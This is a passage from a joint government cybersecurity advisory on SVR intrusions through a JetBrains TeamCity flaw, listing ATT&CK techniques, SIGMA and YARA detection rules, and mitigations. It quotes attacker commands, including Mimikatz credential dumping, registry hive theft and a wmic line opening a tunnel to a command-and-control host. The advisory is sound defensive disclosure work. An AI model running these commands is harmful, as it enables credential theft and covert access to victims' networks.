topology that can be used during targeting. |\n| Gather Victim Host Information: Software | [T1592\\.002](https://attack.mitre.org/versions/v14/techniques/T1592/002/ \"Gather Victim Host Information: Software\") | SVR cyber actors may gather information about the victim\u2019s host networks that can be used during targeting. |\n\n\n\n\n\n*Table 2: SVR Cyber Actors\u2019 ATT\\&CK Techniques for Enterprise \u2013 Initial Access* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Exploit Public\\-Facing Application | [T1190](https://attack.mitre.org/versions/v14/techniques/T1190/ \"Exploit Public-Facing Application\") | SVR cyber actors exploit\u00a0internet\\-connected JetBrains TeamCity server using CVE\\-2023\\-42793 for initial access. |\n\n\n\n\n\n*Table 3: SVR Cyber Actors\u2019 ATT\\&CK Techniques for Enterprise: Execution* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Command and Scripting Interpreter: PowerShell | [T1059\\.001](https://attack.mitre.org/versions/v14/techniques/T1059/001/ \"Command and Scripting Interpreter: PowerShell\") | SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files. |\n| Command and Scripting Interpreter: Windows Command Shell | [T1059\\.003](https://attack.mitre.org/versions/v14/techniques/T1059/003/ \"Command and Scripting Interpreter: Windows Command Shell\") | SVR cyber actors execute these powershell commands to perform host reconnaissance:  * powershell (\\[adsisearcher]\"((samaccountname\\=\\<redacted\\>))\").Findall().Properties * powershell (\\[adsisearcher]\"((samaccountname\\=\\<redacted\\>))\").Findall().Properties.memberof * powershell Get\\-WmiObject \\-Class Win32\\_Service \\-Computername * powershell Get\\-WindowsDriver \\-Online \\-All |\n| Exploitation for Client Execution | [T1203](https://attack.mitre.org/versions/v14/techniques/T1203/ \"Exploitation for Client Execution\") | SVR cyber actors leverage arbitrary code execution after exploiting CVE\\-2023\\-42793\\. |\n| Hijack Execution Flow: DLL Side\\-Loading | [T1574\\.002](https://attack.mitre.org/versions/v14/techniques/T1574/002/ \"Hijack Execution Flow: DLL Side-Loading\") | SVR cyber actors use a variant of GraphicalProton that uses DLL hijacking in Zabbix as a means to start execution. |\n\n\n\n\n\n*Table 4: SVR Cyber Actors\u2019 ATT\\&CK Techniques for Enterprise: Persistence* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Scheduled Task | [T1053\\.005](https://attack.mitre.org/versions/v14/techniques/T1053/005/ \"Scheduled Task\") | SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code. |\n| Server Software Component: SQL Stored Procedures | [T1505\\.001](https://attack.mitre.org/versions/v14/techniques/T1505/001/ \"Server Software Component: SQL Stored Procedures\") | SVR cyber actors abuse SQL server stored procedures to maintain persistence. |\n| Boot or Logon Autostart Execution | [T1547](https://attack.mitre.org/versions/v14/techniques/T1547/ \"Boot or Logon Autostart Execution\") | SVR cyber actors used C:\\\\Windows\\\\system32\\\\ntoskrnl.exe to configure automatic system boot settings to maintain persistence. |\n\n\n\n\n\n*Table 5: SVR Cyber Actors\u2019 ATT\\&CK Techniques for Enterprise: Privilege Escalation* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Exploitation for Privilege Escalation | [T1068](https://attack.mitre.org/versions/v14/techniques/T1068/ \"Exploitation for Privilege Escalation\") | SVR cyber actors exploit JetBrains TeamCity vulnerability to achieve escalated privileges.     To avoid detection, the SVR cyber actors used a \u201cBring Your Own Vulnerable Driver\u201d\u00a0 technique to disable EDR and AV defense mechanisms. |\n| Account Manipulation | [T1098](https://attack.mitre.org/versions/v14/techniques/T1098/ \"Account Manipulation\") | SVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems. |\n\n\n\n\n\n*Table 6: SVR Cyber Actors\u2019 ATT\\&CK Techniques for Enterprise: Defense Evasion* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Obfuscated Files or Information: Binary Padding | [T1027\\.001](https://attack.mitre.org/versions/v14/techniques/T1027/001/ \"Obfuscated Files or Information: Binary Padding\") | SVR cyber actors use BMPs to perform binary padding while exchange data is exfiltrated to an their C2 station. |\n| Masquerading | [T1036](https://attack.mitre.org/versions/v14/techniques/T1036/ \"Masquerading\") | SVR cyber actors use a variant that uses DLL hijacking     in Zabbix as a means to start execution (and potentially provide long\\-term, hard\\-to\\-detect access) and a variant that masks itself within vcperf,\u00a0an open\\-source C\\+\\+ build analysis tool from Microsoft. |\n| Process Injection | [T1055](https://attack.mitre.org/versions/v14/techniques/T1055/ \"Process Injection\") | SVR cyber actors inject code into AV and EDR processes to evade defenses. |\n| Disable or Modify Tools | [T1562\\.001](https://attack.mitre.org/versions/v14/techniques/T1562/001/ \"Disable or Modify Tools\") | SVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities. |\n| Hide Artifacts | [T1564](https://attack.mitre.org/versions/v14/techniques/T1564/ \"Hide Artifacts\") | SVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection. |\n| Hide Artifacts: Hidden Files and Directories | [T1564\\.001](https://attack.mitre.org/versions/v14/techniques/T1564/001/ \"Hide Artifacts: Hidden Files and Directories\") | When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection\\-specific BMP files \\- with both commands and results. |\n\n\n\n\n\n*Table 7: SVR Cyber actors\u2019 ATT\\&CK Techniques for Enterprise: Credential Access* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| OS Credential Dumping: LSASS Memory | [T1003\\.001](https://attack.mitre.org/versions/v14/techniques/T1003/001/ \"OS Credential Dumping: LSASS Memory\") | SVR cyber actors executed Mimikatz commands in memory to gain access to credentials stored in memory. |\n| OS Credential Dumping: Security Account Manager | [T1003\\.002](https://attack.mitre.org/versions/v14/techniques/T1003/002/ \"OS Credential Dumping: Security Account Manager\") | SVR cyber actors used:  * privilege::debug * lsadump::cache * lsadump::secrets * lsadump::sam * sekurlsa::logonpasswords    Mimikatz commands to gain access to credentials.     Additionally, SVR cyber actors exfiltrated Windows registry hives to steal credentials.  * HKLM\\\\SYSTEM * HKLM\\\\SAM * HKLM\\\\SECURITY |\n| Credentials from Password Stores: Credentials from Web Browsers | [T1555\\.003](https://attack.mitre.org/versions/v14/techniques/T1555/003/ \"Credentials from Password Stores: Credentials from Web Browsers\") | In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins. |\n| Steal or Forge Kerberos Tickets: Golden Ticket | [T1558\\.001](https://attack.mitre.org/versions/v14/techniques/T1558/001/ \"Steal or Forge Kerberos Tickets: Golden Ticket\") | To secure long\\-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs). |\n\n\n\n\n\n*Table 8: SVR Cyber Actors ATT\\&CK Techniques for Enterprise: Discovery* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| System Owner/User Discovery | [T1033](https://attack.mitre.org/versions/v14/techniques/T1033/ \"System Owner/User Discovery\") | SVR cyber actors use these built\\-in commands to perform host reconnaissance:\u00a0whoami /priv, whoami / all, whoami / groups, whoami / domain to perform user discovery. |\n| Network Service Discovery | [T1046](https://attack.mitre.org/versions/v14/techniques/T1046/ \"Network Service Discovery\") | SVR cyber actors performed network reconnaissance using a mix of built\\-in commands and additional tools, such as port scanner and PowerSploit. |\n| Process Discovery | [T1057](https://attack.mitre.org/versions/v14/techniques/T1057/ \"Process Discovery\") | SVR cyber actors use GraphicalProton to gather running processes data. |\n| Gather Victim Network Information | [T1590](https://attack.mitre.org/versions/v14/techniques/T1590/ \"Gather Victim Network Information\") | SVR cyber actors use GraphicalProton to gather victim network information. |\n\n\n\n\n\n*Table 9: SVR Cyber Actors ATT\\&CK Techniques for Enterprise: Lateral Movement* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Exploitation of Remote Services | [T1210](https://attack.mitre.org/versions/v14/techniques/T1210/ \"Exploitation of Remote Services\") | SVR cyber actors may exploit remote services to gain unauthorized access to internal systems once inside a network. |\n| Windows Management Instrumentation | [T1047](https://attack.mitre.org/versions/v14/techniques/T1047/ \"Windows Management Instrumentation\") | SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads.     wmic process call create \"C:\\\\Program Files\\\\Windows Defender Advanced Threat Protection\\\\Sense.exe \\-connect poetpages.com \\-pass M554\\-0sddsf2@34232fsl45t31\" |\n\n\n\n\n\n*Table 10: SVR Cyber Actors ATT\\&CK Techniques for Enterprise: Command and Control* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Dynamic Resolution | [T1568](https://attack.mitre.org/versions/v14/techniques/T1568/ \"Dynamic Resolution\") | SVR may dynamically establish connections to command\\-and\\-control infrastructure to evade common detections and remediations. |\n| Protocol Tunneling | [T1572](https://attack.mitre.org/versions/v14/techniques/T1572/ \"Protocol Tunneling\") | SVR cyber actors may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.     In selected environments, the SVR used an additional tool named, \u201crr.exe\u201d\u2014a modified open source reverse socks tunneler named Rsockstunm\u2014to establish a tunnel to the C2 infrastructure. |\n\n\n\n\n\n*Table 11: SVR Cyber Actors ATT\\&CK Techniques for Enterprise: Exfiltration* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Automated Exfiltration | [T1020](https://attack.mitre.org/versions/v14/techniques/T1020/ \"Automated Exfiltration\") | SVR cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection. |\n| Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/versions/v14/techniques/T1041/ \"Exfiltration Over C2 Channel\") | SVR cyber actors may steal data by exfiltrating it over an existing C2 channel. Stolen data is encoded into normal communications using the same protocol as C2 communications. |\n| Exfiltration Over Web Service | [T1567](https://attack.mitre.org/versions/v14/techniques/T1567/ \"Exfiltration Over Web Service\") | SVR cyber actors use OneDrive and Dropbox to exfiltrate data to their C2 station. |\n\n\n### **INDICATORS OF COMPROMISE**\n\n\n\n***Note:** \n Please refer to Appendix B for a list of IOCs.* \n\n\n\n### **VICTIM TYPES**\n\n\n\n As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet\\-reachable JetBrains TeamCity server, leading to the assessment that SVR\u2019s exploitation of these victims\u2019 networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.\n \n\n\n### **DETECTION METHODS**\n\n\n\n The following rules can be used to detect activity linked to adversary activity. These rules should serve as examples and adapt to each organization\u2019s environment and telemetry.\n \n\n\n#### **SIGMA Rules**\n\n\n\n\n| `title: Privilege information listing via whoami`   `description: Detects whoami.exe execution and listing of privileges`   `author:`   `references: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami`   `date: 2023/11/15`   `logsource:`   `category: process_creation`   `product: windows`   `detection:`   `selection:`   `Image|endswith:`   `- 'whoami.exe'`   `CommandLine|contains:`   `- 'priv'`   `- 'PRIV'`   `condition: selection`   `falsepositives: legitimate use by system administrator`     `title: DC listing via nltest`   `description: Detects nltest.exe execution and DC listing`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: process_creation`   `product: windows`   `detection:`   `selection:`   `Image|endswith:`   `- 'nltest.exe'`   `CommandLine|re: '.*dclist\\:.*|.*DCLIST\\:.*|.*dsgetdc\\:.*|.*DSGETDC\\:.*'`   `condition: selection`   `falsepositives: legitimate use by system administrator`    `title: DLL execution via WMI`   `description: Detects DLL execution via WMI`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: process_creation`   `product: windows`   `detection:`   `selection:`   `Image|endswith:`   `- 'WMIC.exe'`   `CommandLine|contains|all:`   `- 'call'`   `- 'rundll32'`   `condition: selection`   `falsepositives: legitimate use by software or system administrator`    `title: Process with connect and pass as args`   `description: Process with connect and pass as args`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: process_creation`   `product: windows`   `detection:`   `selection:`   `CommandLine|contains|all:`   `- 'pass'`   `- 'connect'`   `condition: selection`   `falsepositives: legitimate use of rsockstun or software with exact same arguments`    `title: Service or Drive enumeration via powershell`   `description: Service or Drive enumeration via powershell`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: ps_script`   `product: windows`   `detection:`   `selection_1:`   `ScriptBlockText|contains|all:`   `- 'Get-WmiObject'`   `- '-Class'`   `- 'Win32_Service'`   `selection_2:`   `ScriptBlockText|contains|all:`   `- 'Get-WindowsDriver'`   `- '-Online'`   `- '-All'`   `condition: selection_1 or selection_2`   `falsepositives: legitimate use by system administrator`    `title: Compressing files from temp to temp`   `description: Compressing files from temp\\ to temp used by SVR to prepare data to be exfiltrated`   `references:`   `author:`   `date: 2023/11/15`   `logsource:`   `category: ps_script`   `product: windows`   `detection:`   `selection:`   `ScriptBlockText|re: '.*Compress\\-Archive.*Path.*Windows\\\\[Tt]{1}emp\\\\[1-9]{1}.*DestinationPath.*Windows\\\\[Tt]{1}emp\\\\.*'`   `condition: selection`     `title: DLL names used by SVR for GraphicalProton backdoor`   `description: Hunts for known SVR-specific DLL names.`   `references:`   `author:`   `date: 2023/11/15`   `logsource:`   `category: image_load`   `product: windows`   `detection:`   `selection:`   `ImageLoaded|endswith:`   `- 'AclNumsInvertHost.dll'`   `- 'ModeBitmapNumericAnimate.dll'`   `- 'UnregisterAncestorAppendAuto.dll'`   `- 'DeregisterSeekUsers.dll'`   `- 'ScrollbarHandleGet.dll'`   `- 'PerformanceCaptionApi.dll'`   `- 'WowIcmpRemoveReg.dll'`   `- 'BlendMonitorStringBuild.dll'`   `- 'HandleFrequencyAll.dll'`   `- 'HardSwapColor.dll'`   `- 'LengthInMemoryActivate.dll'`   `- 'ParametersNamesPopup.dll'`   `- 'ModeFolderSignMove.dll'`   `- 'ChildPaletteConnected.dll'`   `- 'AddressResourcesSpec.dll'`   `condition: selection`     `title: Sensitive registry entries saved to file`   `description: Sensitive registry entries saved to file`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: process_creation`   `product: windows`   `detection:`   `selection_base:`   `Image|endswith:`   `- 'reg.exe'`   `CommandLine|contains: 'save'`   `CommandLine|re: '.*HKLM\\\\SYSTEM.*|.*HKLM\\\\SECURITY.*|.*HKLM\\\\SAM.*'`   `selection_file:`   `CommandLine|re: '.*sy\\.sa.*|.*sam\\.sa.*|.*se\\.sa.*'`   `condition: selection_base and selection_file`    `title: Scheduled tasks names used by SVR for GraphicalProton backdoor`   `description: Hunts for known SVR-specific scheduled task names`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: taskscheduler`   `product: windows`   `detection:`   `selection:`   `EventID:`   `- 4698`   `- 4699`   `- 4702`   `TaskName:`   `- '\\Microsoft\\Windows\\IISUpdateService'`   `- '\\Microsoft\\Windows\\WindowsDefenderService'`   `- '\\Microsoft\\Windows\\WindowsDefenderService2'`   `- '\\Microsoft\\DefenderService'`   `- '\\Microsoft\\Windows\\DefenderUPDService'`   `- '\\Microsoft\\Windows\\WiMSDFS'`   `- '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'`   `- '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'`   `- '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'`   `- '\\WindowUpdate'`   `- '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'`   `- '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'`   `- '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'`   `- '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'`   `- '\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update'`   `- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'`   `- '\\Microsoft\\Windows\\ATPUpd'`   `- '\\Microsoft\\Windows\\Windows Defender\\Service Update'`   `- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'`   `- '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'`   `- '\\Defender'`   `- '\\defender'`   `- '\\\\Microsoft\\\\Windows\\\\IISUpdateService'`   `- '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService'`   `- '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2'`   `- '\\\\Microsoft\\\\DefenderService'`   `- '\\\\Microsoft\\\\Windows\\\\DefenderUPDService'`   `- '\\\\Microsoft\\\\Windows\\\\WiMSDFS'`   `- '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck'`   `- '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting'`   `- '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service'`   `- '\\\\WindowUpdate'`   `- '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting'`   `- '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck'`   `- '\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask'`   `- '\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart'`   `- '\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\Data Integrity Update'`   `- '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'`   `- '\\\\Microsoft\\\\Windows\\\\ATPUpd'`   `- '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update'`   `- '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check'`   `- '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'`   `- '\\\\Defender'`   `- '\\\\defender'`   `condition: selection`     `title: Scheduled tasks names used by SVR for GraphicalProton backdoor`   `description: Hunts for known SVR-specific scheduled task names`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: process_creation`   `product: windows`   `detection:`   `selection:`   `Image|endswith:`   `- 'schtasks.exe'`   `CommandLine|contains:`   `- 'IISUpdateService'`   `- 'WindowsDefenderService'`   `- 'WindowsDefenderService2'`   `- 'DefenderService'`   `- 'DefenderUPDService'`   `- 'WiMSDFS'`   `- 'StartupAppTaskCkeck'`   `- 'SubmitReporting'`   `- 'Defender Update Service'`   `- 'WindowUpdate'`   `- 'CheckReporting'`   `- 'StartupAppTaskCheck'`   `- 'SpeechModelInstallTask'`   `- 'BfeOnServiceStart'`   `- 'Data Integrity Update'`   `- 'Scheduled AutoCheck'`   `- 'ATPUpd'`   `- 'Service Update'`   `- 'Scheduled Check'`   `- 'Scheduled AutoCheck'`   `- 'Defender'`   `- 'defender'`   `selection_re:`   `Image|endswith:`   `- 'schtasks.exe'`   `CommandLine|re:`   `- '.*Defender\\sUpdate\\sService.*'`   `- '.*Data\\sIntegrity\\sUpdate.*'`   `- '.*Scheduled\\sAutoCheck.*'`   `- '.*Service\\sUpdate.*'`   `- '.*Scheduled\\sCheck.*'`   `- '.*Scheduled\\sAutoCheck.*'`   `condition: selection or selection_re`    `title: Suspicious registry modifications`   `description: Suspicious registry modifications`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: registry_set`   `product: windows`   `detection:`   `selection:`   `EventID: 4657`   `TargetObject|contains:`   `- 'CurrentControlSet\\\\Control\\\\Lsa\\\\DisableRestrictedAdmin'`   `- 'CurrentControlSet\\\\Control\\\\Lsa\\\\NoLMHash'`   `condition: selection`     `title: Registry modification from cmd`   `description: Registry modification from cmd`   `author:`   `references:`   `date: 2023/11/15`   `logsource:`   `category: process_creation`   `product: windows`   `detection:`   `selection:`   `Image|endswith:`   `- 'reg.exe'`   `CommandLine|contains|all:`   `- 'CurrentControlSet'`   `- 'Lsa'`   `CommandLine|contains:`   `- 'DisableRestrictedAdmin'`   `- 'NoLMHash'`   `condition: selection`    `title: Malicious Driver Load`   `description: Detects the load of known malicious drivers via their names or hash.`   `references:`   `- https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detection`   `author:`   `date: 2023/11/15`   `logsource:`   `category: driver_load`   `product: windows`   `detection:`   `selection_name:`   `ImageLoaded|endswith:`   `- 'RTCore64.sys'`   `- 'DBUtils_2_3.sys'`   `selection_hash:`   `Hashes|contains:`   `- '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'`   `- '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'`   `condition: selection_name or selection_hash` |\n| --- |\n\n\n#### **YARA rules**\n\n\n\n The following rule detects most known GraphicalProton variants.\n \n\n\n\n\n| `rule APT29_GraphicalProton {`   `strings:`   `// C1 E9 1B \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0shr \u00a0 \u00a0 ecx, 1Bh`   `// 48 8B 44 24 08 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+30h+var_28]`   `// 8B 50 04 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 edx, [rax+4]`   `// C1 E2 05 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0shl \u00a0 \u00a0 edx, 5`   `// 09 D1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 or \u00a0 \u00a0 \u00a0ecx, edx`   `// 48 8B 44 24 08 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+30h+var_28]`   `$op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 | 08 | 10 | 0d | 07) 09 ?? 48 }`    `// 48 05 20 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 20h ; ' '`   `// 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax`   `// 48 8D 15 0A A6 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E546`   `// 41 B8 30 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 30h ; '0'`   `// E8 69 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0`   `// 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]`   `// 48 05 40 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 40h ; '@'`   `// 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax`   `// 48 8D 15 1B A6 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E577`   `// 41 B8 70 01 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 170h`   `// E8 49 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0`   `// 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]`   `// 48 05 60 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 60h ; '`'`   `// 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax`   `// 48 8D 15 6C A7 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E6E8`   `// 41 B8 2F 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 2Fh ; '/'`   `// E8 29 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0`   `// 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]`   `// 48 05 80 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 80h`   `// 48 89 C1 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rcx, rax`   `// 48 8D 15 7C A7 0D 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0lea \u00a0 \u00a0 rdx, unk_14011E718`   `// 41 B8 2F 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 mov \u00a0 \u00a0 r8d, 2Fh ; '/'`   `// E8 09 B5 FE FF \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0call \u00a0 \u00a0sub_14002F4B0`   `// 48 8B 44 24 30 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0mov \u00a0 \u00a0 rax, [rsp+88h+var_58]`   `// 48 05 A0 00 00 00 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 add \u00a0 \u00a0 rax, 0A0h`   `$op_decrypt_config = {`   `48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]`   `48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]`   `48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]`   `48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]`   `48 05 A0 00 00 00`   `}`    `condition:`   `all of them`   `}` |\n| --- |\n\n\n\n**Note:** \n These rules are meant for threat hunting and have not been tested on a larger dataset.\n \n\n\n### **MITIGATIONS**\n\n\n\n The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of this campaign poses a threat to public safety and recommend organizations implement the mitigations below to improve organization\u2019s cybersecurity posture. These mitigations align with the Cross\\-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA\u2019s\n [Cross\\-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals \"Cross-Sector Cybersecurity Performance Goals\") \n for more information on the CPGs, including additional recommended baseline protections.\n \n\n\n* **Apply available patches** \n for CVE\\-2023\\-42793 